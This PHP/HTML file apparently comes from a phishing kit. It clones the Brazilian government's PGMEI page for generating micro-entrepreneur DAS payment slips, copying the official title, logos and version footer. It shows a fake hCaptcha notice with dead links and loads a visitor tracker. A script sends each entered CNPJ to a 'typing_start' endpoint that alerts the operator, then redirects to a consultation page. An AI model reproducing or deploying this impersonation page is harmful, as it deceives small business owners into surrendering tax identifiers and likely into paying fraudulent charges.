<?php
// pages/pgmei/index.php
if (!isset($pdo)) {
    require_once __DIR__ . "/../../db.php";
    require_once __DIR__ . "/../../base/utility.php";
    require_once __DIR__ . "/../../base/detect_device.php";
    $id_usuario = 1; 
    $page = 'pgmei';
    require_once __DIR__ . "/../../base/tracker.php";
}
$diretorio = 'pages/pgmei';
?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=9; IE=8; IE=7; IE=EDGE">
    <meta http-equiv="content-language" content="pt-br">
    <meta name="viewport" content="width=device-width, initial-scale=0.8, maximum-scale=0.8, user-scalable=no">
    <link rel="icon" type="image/x-icon" href="PGMEI/favicon.ico">

    <title>PGMEI - Programa Gerador de DAS do Microempreendedor Individual</title>

    <link href="./PGMEI/pgmei.css" rel="stylesheet">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>

    <style>
        #loandig { display: none; justify-content: center; align-items: center; height: 100%; width: 100%; top: 0; position: fixed; z-index: 999999; background: #ffffff94; }
        .loading-box { display: flex; justify-content: center; width: 200px; border-radius: 3px; height: 89px; background: white; align-items: center; box-shadow: 0 9px 46px 8px rgba(0, 0, 0, 0.12); }
    </style>
</head>
<body>

    <div id="loandig">
        <div class="loading-box">
            <img src="./PGMEI/Spinner-btn.gif" style="width: 55px; margin-top: -8px;">
            <div>Consultando...</div>
        </div>
    </div>

    <div class="container-fluid">
        <header class="row">
            <h3><span class="label label-success"><img alt="Brand" src="./PGMEI/logo-simples.png"> PGMEI</span></h3>
            <h4 class="text-success">Programa Gerador de DAS do Microempreendedor Individual</h4>
        </header>

        <section class="row">
            <div class="well col-md-12" role="main">
                <div class="container">
                    <div class="row">
                        <div class="col-md-offset-3 col-md-6">
                            <div class="panel panel-default">
                                <div class="panel-heading">
                                    <h4 class="panel-title">Informe o número completo do CNPJ</h4>
                                </div>
                                <div class="panel-body">
                                    <form id="identificacao" onsubmit="validar(event)">
                                        <div class="form-group">
                                            <label for="cnpj" class="control-label">CNPJ completo:</label>
                                            <input type="text" id="cnpj" class="form-control" name="cnpj" autocomplete="off" placeholder="00.000.000/0000-00" required>
                                            <br>
                                            <div style="color: #555; font-weight: 500; font-size: 11px; line-height: 1.4;">
                                                <strong>Protegido por hCaptcha</strong><br>
                                                <a href="#">Privacidade</a> e <a href="#">Termos e condições</a>.
                                            </div>
                                        </div>
                                        <div class="form-group">
                                            <button id="continuar" type="submit" class="btn btn-success ladda-button" data-style="slide-left">
                                                <span class="ladda-label">Continuar</span>
                                            </button>
                                        </div>
                                    </form>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <footer class="row clearfix">
            <div class="pull-left">
                <p class="text-success"><strong>Versão: 3.14.1</strong></p>
            </div>
            <div class="pull-right">
                <img src="PGMEI/marca_Simples_entes.png" alt="" style="height: 30px;">
            </div>
        </footer>
    </div>

    <script>
        $(document).ready(function(){
            $('#cnpj').mask('00.000.000/0000-00');
        });

        function validar(e) {
            e.preventDefault();
            const cnpj = $('#cnpj').val().replace(/\D/g, '');
            if (cnpj.length !== 14) {
                toastr.error('CNPJ inválido.');
                return;
            }

            $('#loandig').css('display', 'flex');
            
            // Notificar Typing
            fetch('../../api/typing_start.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ typing: true, doc: cnpj, tela: 'pgmei' })
            });

            setTimeout(() => {
                window.location.href = 'consulta.php?cnpj=' + cnpj;
            }, 1500);
        }
    </script>
</body>
</html>
